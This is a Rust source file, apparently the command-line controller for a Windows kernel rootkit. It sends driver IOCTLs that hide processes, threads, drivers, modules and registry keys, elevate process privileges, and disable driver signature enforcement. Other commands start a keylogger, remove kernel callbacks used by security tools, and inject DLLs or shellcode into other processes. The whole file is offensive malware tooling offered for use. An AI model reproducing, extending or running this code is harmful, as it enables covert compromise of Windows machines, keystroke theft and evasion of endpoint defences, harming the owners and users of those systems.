use {
    cli::*,
    log::*,
    colored::*, 
    clap::Parser,
    std::io::Write,
    log::LevelFilter,
    shared::ioctls::*,
    env_logger::Builder,
};
use modules::{
    callback::{enumerate_callback, remove_callback, restore_callback}, driver::{enumerate_driver, unhide_hide_driver}, injection::{injection_apc, injection_thread}, misc::{dse, keylogger}, module::{enumerate_module, hide_module}, process::{
        elevate_process, 
        enumerate_process, hide_unhide_process, 
        signature_process, terminate_process
    }, thread::{enumerate_thread, hide_unhide_thread}
};

#[cfg(not(feature = "mapper"))]
use modules::{
    registry::{registry_protection, registry_hide_unhide},
    process::protection_process,
    thread::protection_thread,
};

mod modules;
mod cli;
mod utils;

fn main() {
    let args = Cli::parse();
    let mut builder = Builder::new();
    let log_level = match args.verbose {
        0 => LevelFilter::Info, 
        _ => LevelFilter::Debug 
    };

    builder.filter(None, log_level).format(|buf, record| {
        let timestamp = chrono::Local::now().format("%Y-%m-%dT%H:%M:%S");
        let level = match record.level() {
            Level::Error => "ERROR".red().bold(),
            Level::Warn  => "WARN ".yellow().bold(),
            Level::Info  => "INFO ".green(),
            Level::Debug => "DEBUG".bright_black(),
            Level::Trace => "TRACE".blue(),
        };

        writeln!(buf, "[{}] {} [shadow] {}", timestamp, level, record.args())
    }).init();

    match &args.command {
        Commands::Process { sub_command } => match sub_command {
            ProcessCommands::Elevate { pid } => {
                info!("Elevate Process: {pid}");
                elevate_process(Some(pid), IOCTL_ELEVATE_PROCESS);
            },
            ProcessCommands::Hide { pid } => {
                info!("Hide Process: {pid}");
                hide_unhide_process(Some(pid), IOCTL_HIDE_UNHIDE_PROCESS, true);
            },
            ProcessCommands::Unhide { pid } => {
                info!("UnHide Process: {pid}");
                hide_unhide_process(Some(pid), IOCTL_HIDE_UNHIDE_PROCESS, false);
            },
            ProcessCommands::Terminate { pid } => {
                info!("Terminate Process: {pid}");
                terminate_process(Some(pid), IOCTL_TERMINATE_PROCESS);
            },
            ProcessCommands::Signature { pid, pt, sg } => {
                info!("Signature Process: {pid}");
                signature_process(Some(pid), IOCTL_SIGNATURE_PROCESS, sg, pt);
            },
            #[cfg(not(feature = "mapper"))]
            ProcessCommands::Protection { pid, add, remove } => {
                info!("Protection Process: {pid}");
                if *add {
                    protection_process(Some(pid), IOCTL_PROTECTION_PROCESS, true);
                } else if *remove {
                    protection_process(Some(pid), IOCTL_PROTECTION_PROCESS, false);
                } else {
                    error!("No action provided");
                }
            },
            ProcessCommands::Enumerate { list, type_ } => {
                info!("Enumerate Process");
                if *list {
                    enumerate_process(IOCTL_ENUMERATION_PROCESS, type_);
                }
            }
        },
        Commands::Thread { sub_command } => match sub_command {
            ThreadCommands::Hide { tid } => {
                info!("Hide Thread: {tid}");
                hide_unhide_thread(Some(tid), IOCTL_HIDE_UNHIDE_THREAD, true);
            },
            ThreadCommands::Unhide { tid } => {
                info!("Unhide Thread: {tid}");
                hide_unhide_thread(Some(tid), IOCTL_HIDE_UNHIDE_THREAD, false);
            },
            #[cfg(not(feature = "mapper"))]
            ThreadCommands::Protection { tid	, add, remove } => {
                if *add {
                    protection_thread(Some(tid), IOCTL_PROTECTION_THREAD, true);
                } else if *remove {
                    protection_thread(Some(tid), IOCTL_PROTECTION_THREAD, false);
                } else {
                    error!("No action provided");
                }
            },
            ThreadCommands::Enumerate { list, type_ } => {
                info!("Enumerate Thread");
                if *list {
                    enumerate_thread(IOCTL_ENUMERATION_THREAD, type_);
                }
            }
        },
        Commands::Driver { hide, unhide, list, name } => {
            if *hide {
                info!("Hide Driver");
                match name {
                    Some(name) => unhide_hide_driver(IOCTL_HIDE_UNHIDE_DRIVER, name, true),
                    None => {
                        error!("No action provided for driver.");
                        return;
                    }
                }
            } else if *unhide {
                info!("Unhide Driver");
                match name {
                    Some(name) => unhide_hide_driver(IOCTL_HIDE_UNHIDE_DRIVER, name, false),
                    None => {
                        error!("No action provided for driver.");
                        return;
                    }
                }
            } else if *list {
                info!("Enumerate Driver");
                enumerate_driver(IOCTL_ENUMERATE_DRIVER);
            }
        },
        Commands::Misc { sub_command } => match sub_command {
            MisCommands::DSE { disable, enable } =>  {
                if *enable {
                    info!("Enable DSE");
                    dse(IOCTL_ENABLE_DSE, true);
                } else if *disable {
                    info!("Disable DSE");
                    dse(IOCTL_ENABLE_DSE, false);
                }
            },
            MisCommands::Keylogger { stop, start } => {
                if *start {
                    info!("Start Keylogger");
                    keylogger(IOCTL_KEYLOGGER, true);
                } else if *stop {
                    info!("Stop Keylogger");
                    keylogger(IOCTL_KEYLOGGER, false);
                }
            },
        },

        #[cfg(not(feature = "mapper"))]
        Commands::Registry { sub_command } => match sub_command {
            RegistryCommands::Protect { key, name, add, remove } => {
                if *add && *remove {
                    error!("Both add and remove options cannot be specified at the same time");
                } else if *add {
                    match name {
                        Some(ref name) => {
                            registry_protection(IOCTL_REGISTRY_PROTECTION_VALUE, name, &key, true);
                        },
                        None => {
                            registry_protection(IOCTL_REGISTRY_PROTECTION_KEY, &"".to_string(), &key, true);
                        }
                    }
                } else if *remove {
                    match name {
                        Some(ref name) => {
                            registry_protection(IOCTL_REGISTRY_PROTECTION_VALUE, name, &key, false);
                        },
                        None => {
                            registry_protection(IOCTL_REGISTRY_PROTECTION_KEY,&"".to_string(), &key, false);
                        }
                    }
                } else {
                    error!("Either add or remove must be specified");
                }
            },
            RegistryCommands::Hide { key, value } => {
                match value {
                    Some(ref value) => {
                        registry_hide_unhide(IOCTL_HIDE_UNHIDE_VALUE, value, &key, true);
                    },
                    None => {
                        registry_hide_unhide(IOCTL_HIDE_UNHIDE_KEY, &"".to_string(), &key, true);
                    }
                }
            }
            RegistryCommands::Unhide { key, value } => {
                match value {
                    Some(ref value) => {
                        registry_hide_unhide(IOCTL_HIDE_UNHIDE_VALUE, value, &key, false);
                    },
                    None => {
                        registry_hide_unhide(IOCTL_HIDE_UNHIDE_KEY, &"".to_string(), &key, false);
                    }
                }
            },
        },
        Commands::Module { sub_command } => match sub_command {
            ModuleCommands::Hide { module, pid } =>  {
                hide_module(IOCTL_HIDE_MODULE, module, *pid);
            },
            ModuleCommands::Enumerate { pid } => {
                enumerate_module(IOCTL_ENUMERATE_MODULE, pid);
            }
        }
        Commands::Callback { list, enumerate ,remove, restore, callback } => {
            if *list {
                info!("Enumerate Callback");
                enumerate_callback(IOCTL_ENUMERATE_CALLBACK, callback);
                return;
            }
            
            if *enumerate {
                info!("Enumerate Removed Callback");
                enumerate_callback(IOCTL_ENUMERATE_REMOVED_CALLBACK, callback);
                return;
            }

            match (remove, restore) {
                (Some(index), None) => {
                    info!("Remove Callback: {index}");
                    remove_callback(*index, IOCTL_REMOVE_CALLBACK, callback);
                },
                (None, Some(index)) => {
                    info!("Restore Callback: {index}");
                    restore_callback(*index, IOCTL_RESTORE_CALLBACK, callback);
                },
                (Some(_), Some(_)) => {
                    error!("Cannot remove and restore at the same time");
                },
                (None, None) => {
                    error!("No action provided for callback");
                },
            }
        },
        Commands::Injection { sub_command } => match sub_command {
            InjectionCommands::DLL { pid, path, type_ } => {
                match type_ {
                    Injection::Thread => {
                        injection_thread(IOCTL_INJECTION_DLL_THREAD, pid, path)
                    },
                    Injection::APC => {
                        injection_apc(IOCTL_INJECTION_DLL_APC, pid, path)
                    },
                }
            },
            InjectionCommands::Shellcode { pid, path, type_ } => {
                match type_ {
                    Injection::Thread => {
                        injection_thread(IOCTL_INJECTION_SHELLCODE_THREAD, pid, path)
                    },
                    Injection::APC => {
                        injection_apc(IOCTL_INJECTION_SHELLCODE_APC, pid, path);
                    }
                }
            },
        }
    }
}
